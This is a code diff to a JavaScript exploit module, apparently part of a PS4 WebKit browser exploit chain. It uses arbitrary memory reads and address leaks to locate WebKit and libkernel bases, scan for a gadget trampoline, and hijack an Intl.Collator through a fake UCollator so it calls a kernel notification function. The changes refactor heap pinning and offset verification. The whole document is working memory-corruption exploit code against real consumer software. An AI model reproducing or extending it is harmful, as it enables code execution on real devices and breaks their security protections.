@@ -3,7 +3,6 @@
  * Runs post slopkit-core-1 primitive — no Math.expm1 pivot.
  */
 import { int64 } from "./int64.js";
-import { resolveBufAddrOff } from "./native_call.js";
 
 const COLLATOR_UCOLLATOR_OFF = 0x18;
 const COLLATOR_BOUND_COMPARE_OFF = 0x10;
@@ -17,8 +16,9 @@ const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
 const DEFAULT_MESSAGE = "PS4 WebKit PoC";
 const LK_TEXT_SCAN = 0x40000;
 const LK_TEXT_SCAN_STEP = 16;
-/** slopkit JSArrayBufferView.m_vector candidates (cell + off) */
-const VIEW_VECTOR_CAND = [0x10, 0x8, 0x18, 0x20, 0x28];
+/** slopkit JSArrayBufferView.m_vector — default +0x10 only (OOM-safe) */
+const VIEW_VECTOR_DEFAULT = 0x10;
+const VIEW_VECTOR_EXTRA = [0x8, 0x18, 0x20];
 const TRAMPOLINE_PATTERN = new Uint8Array([
     0x48, 0x8b, 0x8f, 0xe0, 0x00, 0x00, 0x00, 0x51,
     0x48, 0x8b, 0x4f, 0x60, 0x48, 0x8b, 0x7f, 0x48, 0xc3,
@@ -113,10 +113,11 @@ function backingFromArrayBufferChain(p, leakval, ab, implOff, dataOff) {
 }
 
 /**
- * Resolve gigacage backing for arena Uint8Array.
- * slopkit uses JSArrayBufferView.m_vector (+0x10); table impl chain is fallback.
+ * Resolve gigacage backing — 1 leakval + 1–2 reads by default (no bufAddr scan).
  */
-function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log) {
+function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts) {
+    opts = opts || {};
+    const arenaScan = opts.arenaScan === true;
     let viewCell;
     try { viewCell = leakval(arenaView); } catch (e) {
         log("NOTIFY-ARENA", "leakval(view) failed: " + (e && e.message ? e.message : e));
@@ -124,30 +125,29 @@ function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log) {
     }
     log("NOTIFY-ARENA", "viewCell=" + viewCell);
 
-    for (let i = 0; i < VIEW_VECTOR_CAND.length; i++) {
-        const slot = VIEW_VECTOR_CAND[i];
+    function trySlot(slot) {
         const ptr = readCanonicalPtr(p, viewCell.add32(slot));
-        if (!ptr) continue;
+        if (!ptr) return null;
         if (verifyArenaMarker(p, ptr)) {
             log("NOTIFY-ARENA", "m_vector +0x" + slot.toString(16) + " → " + ptr);
             return ptr;
         }
         if (plausibleBackingPtr(ptr))
             log("NOTIFY-ARENA", "+0x" + slot.toString(16) + "=" + ptr + " marker miss");
+        return null;
     }
 
-    const addrOff = resolveBufAddrOff(p, off);
-    if (addrOff) {
+    let hit = trySlot(VIEW_VECTOR_DEFAULT);
+    if (hit) return hit;
+
+    if (opts.bufAddrOff) {
+        const ba = opts.bufAddrOff;
         const data = backingFromArrayBufferChain(
-            p, leakval, arenaBuffer, addrOff.implOff, addrOff.dataOff);
+            p, leakval, arenaBuffer, ba.implOff, ba.dataOff);
         if (data && verifyArenaMarker(p, data)) {
-            log("NOTIFY-ARENA", "ArrayBuffer chain via " + addrOff.via
-                + " impl+0x" + addrOff.implOff.toString(16)
-                + " data+0x" + addrOff.dataOff.toString(16) + " → " + data);
+            log("NOTIFY-ARENA", "prep bufAddr impl+0x" + ba.implOff.toString(16) + " → " + data);
             return data;
         }
-        if (data)
-            log("NOTIFY-ARENA", "ArrayBuffer chain " + data + " marker miss");
     }
 
     const implOff = off.wk_ArrayBuffer_m_impl;
@@ -160,12 +160,15 @@ function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log) {
         }
     }
 
-    log("NOTIFY-ARENA-FAIL", "no backing — view dumps:");
-    for (let j = 0; j < VIEW_VECTOR_CAND.length; j++) {
-        const slot = VIEW_VECTOR_CAND[j];
-        const ptr = readCanonicalPtr(p, viewCell.add32(slot));
-        log("NOTIFY-ARENA-FAIL", "  view+0x" + slot.toString(16) + "=" + (ptr || "?"));
+    if (arenaScan) {
+        for (let i = 0; i < VIEW_VECTOR_EXTRA.length; i++) {
+            hit = trySlot(VIEW_VECTOR_EXTRA[i]);
+            if (hit) return hit;
+        }
     }
+
+    log("NOTIFY-ARENA-FAIL", "no backing @ +0x" + VIEW_VECTOR_DEFAULT.toString(16)
+        + (arenaScan ? " (extra slots tried)" : " — add ?arenascan=1"));
     return null;
 }
 
@@ -250,30 +253,30 @@ function resolveLibkernelFromGot(p, webkitBase, cfg, log) {
 function findTrampolineRva(p, lk, knownRva, log, opts) {
     opts = opts || {};
     const allowScan = opts.gdScan === true;
-    if (knownRva > 0) {
+    const verifyGd = opts.gdVerify === true;
+    if (knownRva > 0 && !verifyGd) {
+        log("NOTIFY-GD", "trust gd=0x" + knownRva.toString(16) + " (0 reads)");
+        return knownRva;
+    }
+    if (knownRva > 0 && verifyGd) {
         try {
             const addr = lk.add32(knownRva);
-            const buf = new Uint8Array(TRAMPOLINE_PATTERN.length);
-            for (let i = 0; i < buf.length; i++)
-                buf[i] = p.read1(addr.add32(i));
             let ok = true;
             for (let i = 0; i < TRAMPOLINE_PATTERN.length; i++) {
-                if (buf[i] !== TRAMPOLINE_PATTERN[i]) { ok = false; break; }
+                if (p.read1(addr.add32(i)) !== TRAMPOLINE_PATTERN[i]) { ok = false; break; }
             }
             if (ok) {
                 log("NOTIFY-GD", "verified gd=0x" + knownRva.toString(16));
                 return knownRva;
             }
-            log("NOTIFY-GD", "gd=0x" + knownRva.toString(16) + " bytes mismatch"
-                + (allowScan ? " — scanning" : " — use ?gd=0x… or ?gdscan=1"));
+            log("NOTIFY-GD", "gd=0x" + knownRva.toString(16) + " bytes mismatch");
         } catch (e) {
-            log("NOTIFY-GD", "read failed @ gd=0x" + knownRva.toString(16)
-                + " " + (e && e.message ? e.message : e));
+            log("NOTIFY-GD", "gd read failed: " + (e && e.message ? e.message : e));
         }
     }
     if (!allowScan) {
         if (knownRva > 0) {
-            log("NOTIFY-GD-WARN", "using unverified gd=0x" + knownRva.toString(16));
+            log("NOTIFY-GD-WARN", "using gd=0x" + knownRva.toString(16) + " unverified");
             return knownRva;
         }
         return null;
@@ -298,8 +301,60 @@ function findTrampolineRva(p, lk, knownRva, log, opts) {
     return knownRva > 0 ? knownRva : null;
 }
 
-function arrayBufferBacking(p, off, arenaBuffer, arenaView, leakval, log) {
-    return resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log);
+function arrayBufferBacking(p, off, arenaBuffer, arenaView, leakval, log, opts) {
+    return resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts);
+}
+
+/**
+ * Pin collator + arena @ PRIMITIVE-OK while heap is fresh (OOM-safe notify path).
+ */
+export function pinNotifyHeap(ctx) {
+    const p = ctx.p;
+    const off = ctx.off || {};
+    const log = ctx.log || function () { };
+    const leakval = ctx.leakval;
+    const retain = ctx.retain || [];
+    const cfg = resolveNotifyConfig(off, ctx.params);
+
+    log("NOTIFY-PIN", "collator + arena @ fresh heap");
+    const realCollator = new Intl.Collator("en", { usage: "search" });
+    const compareFn = realCollator.compare;
+    if (!(compareFn("a", "b") < 0))
+        throw new Error("notify pin: collator prewarm failed");
+
+    const notificationRequest = buildNotificationRequest(cfg.message);
+    const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
+    const arenaView = new Uint8Array(arenaBuffer);
+    arenaView[ARENA_MARKER_OFF] = 0x52;
+    arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
+    arenaView[ARENA_MARKER_OFF + 2] = 0x50;
+    arenaView[ARENA_MARKER_OFF + 3] = 0x31;
+    retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);
+
+    const realCollatorAddr = leakval(realCollator);
+    const compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
+    const arenaBacking = arrayBufferBacking(
+        p, off, arenaBuffer, arenaView, leakval, log, {
+            bufAddrOff: ctx.bufAddrOff || null,
+            arenaScan: ctx.params && ctx.params.get("arenascan") === "1",
+        });
+    if (!arenaBacking)
+        throw new Error("notify pin: arena backing @ +0x10 failed");
+
+    log("NOTIFY-PIN-OK", "collator=" + realCollatorAddr + " arena=" + arenaBacking);
+    return {
+        realCollator,
+        compareFn,
+        notificationRequest,
+        arenaBuffer,
+        arenaView,
+        arenaBacking,
+        realCollatorAddr,
+        compareFnAddr,
+        webkitBase: ctx.webkitBase || null,
+        nativeFn: ctx.nativeFn || null,
+        cfg,
+    };
 }
 
 /**
@@ -324,7 +379,7 @@ export function stageCollatorNotify(ctx) {
     let webkitBase = ctx.webkitBase || null;
     if (!webkitBase && ctx.nativeFn && off.wk_expm1_builtin)
         webkitBase = ctx.nativeFn.sub32(off.wk_expm1_builtin);
-    if (!webkitBase && cfg.hc.length)
+    if (!webkitBase && cfg.hc.length && !ctx.pinned)
         webkitBase = deriveWebkitFromHc(p, leakval, cfg.hc, log);
     if (!webkitBase || !inPs4ModuleBand(webkitBase))
         throw new Error("notify: webkitBase missing — Start + Save bases");
@@ -335,11 +390,12 @@ export function stageCollatorNotify(ctx) {
     if (!lk || !inPs4ModuleBand(lk))
         lk = resolveLibkernelFromGot(p, webkitBase, cfg, log);
     if (!lk || !inPs4ModuleBand(lk))
-        throw new Error("notify: libkernel missing — 2e Leak+lk or Accept fn");
+        throw new Error("notify: libkernel missing — Accept fn");
 
-    log("NOTIFY-STAGE", "lk=" + lk + " — resolve gd trampoline");
+    log("NOTIFY-STAGE", "lk=" + lk + " gd (0-read trust)");
     const gdRva = findTrampolineRva(p, lk, cfg.gd, log, {
         gdScan: ctx.gdScan === true,
+        gdVerify: ctx.params && ctx.params.get("gdverify") === "1",
     });
     if (gdRva == null)
         throw new Error("notify: gd trampoline not found — ?gd=0x…");
@@ -348,37 +404,61 @@ export function stageCollatorNotify(ctx) {
     if (!ntRva)
         throw new Error("notify: k_notify RVA missing in offset table");
 
-    log("NOTIFY-STAGE", "collator + arena…");
+    let realCollator;
+    let compareFn;
+    let notificationRequest;
+    let arenaBuffer;
+    let arenaView;
+    let realCollatorAddr;
+    let compareFnAddr;
+    let arenaBacking;
 
-    const realCollator = new Intl.Collator("en", { usage: "search" });
-    const compareFn = realCollator.compare;
-    if (!(compareFn("a", "b") < 0))
-        throw new Error("notify: collator prewarm failed");
+    if (ctx.pinned) {
+        log("NOTIFY-STAGE", "reuse pinned collator+arena");
+        const pin = ctx.pinned;
+        realCollator = pin.realCollator;
+        compareFn = pin.compareFn;
+        notificationRequest = pin.notificationRequest;
+        arenaBuffer = pin.arenaBuffer;
+        arenaView = pin.arenaView;
+        realCollatorAddr = pin.realCollatorAddr;
+        compareFnAddr = pin.compareFnAddr;
+        arenaBacking = pin.arenaBacking;
+    } else {
+        log("NOTIFY-STAGE", "collator + arena (late pin — OOM risk, reload + Start first)");
+        realCollator = new Intl.Collator("en", { usage: "search" });
+        compareFn = realCollator.compare;
+        if (!(compareFn("a", "b") < 0))
+            throw new Error("notify: collator prewarm failed");
 
-    const notificationRequest = buildNotificationRequest(cfg.message);
-    if (notificationRequest.length !== NOTIFICATION_REQUEST_SIZE)
-        throw new Error("notify: bad request layout");
+        notificationRequest = buildNotificationRequest(cfg.message);
+        if (notificationRequest.length !== NOTIFICATION_REQUEST_SIZE)
+            throw new Error("notify: bad request layout");
 
-    const prewarm = compareFn(notificationRequest, "b");
-    if (!Number.isFinite(prewarm))
-        throw new Error("notify: request prewarm failed");
-    log("NOTIFY-PREWARM", "result=" + prewarm + " (1 before fake UCollator is normal)");
+        const prewarm = compareFn(notificationRequest, "b");
+        if (!Number.isFinite(prewarm))
+            throw new Error("notify: request prewarm failed");
+        log("NOTIFY-PREWARM", "result=" + prewarm + " (1 is normal before fake UCollator)");
 
-    const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
-    const arenaView = new Uint8Array(arenaBuffer);
-    arenaView[ARENA_MARKER_OFF] = 0x52;
-    arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
-    arenaView[ARENA_MARKER_OFF + 2] = 0x50;
-    arenaView[ARENA_MARKER_OFF + 3] = 0x31;
-    retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);
+        arenaBuffer = new ArrayBuffer(ARENA_BYTES);
+        arenaView = new Uint8Array(arenaBuffer);
+        arenaView[ARENA_MARKER_OFF] = 0x52;
+        arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
+        arenaView[ARENA_MARKER_OFF + 2] = 0x50;
+        arenaView[ARENA_MARKER_OFF + 3] = 0x31;
+        retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);
 
-    const realCollatorAddr = leakval(realCollator);
-    const compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
-    log("NOTIFY-STAGE", "resolve arena backing…");
-    const arenaBacking = arrayBufferBacking(
-        p, off, arenaBuffer, arenaView, leakval, log);
-    if (!arenaBacking)
-        throw new Error("notify: arena backing unresolved — see NOTIFY-ARENA-FAIL lines");
+        realCollatorAddr = leakval(realCollator);
+        compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
+        log("NOTIFY-STAGE", "resolve arena backing…");
+        arenaBacking = arrayBufferBacking(
+            p, off, arenaBuffer, arenaView, leakval, log, {
+                bufAddrOff: ctx.bufAddrOff || null,
+                arenaScan: ctx.params && ctx.params.get("arenascan") === "1",
+            });
+        if (!arenaBacking)
+            throw new Error("notify: arena backing unresolved — see NOTIFY-ARENA-FAIL");
+    }
 
     const verifyMarker = p.read1(arenaBacking.add32(ARENA_MARKER_OFF));
     if (verifyMarker !== ARENA_MARKER)
